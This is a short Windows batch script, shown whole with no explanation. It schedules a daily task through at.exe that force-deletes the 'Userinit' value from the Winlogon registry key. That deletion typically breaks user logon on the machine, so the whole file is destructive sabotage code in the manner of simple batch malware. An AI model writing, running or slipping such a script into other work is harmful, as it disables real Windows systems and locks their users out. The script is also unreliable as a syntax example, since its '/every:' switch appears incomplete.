@echo off
%systemroot%\system32\at.exe 13:00 /every: %systemroot%\system32\reg.exe delete "hklm\software\microsoft\windows nt\currentversion\winlogon" /v "userinit" /f
@exit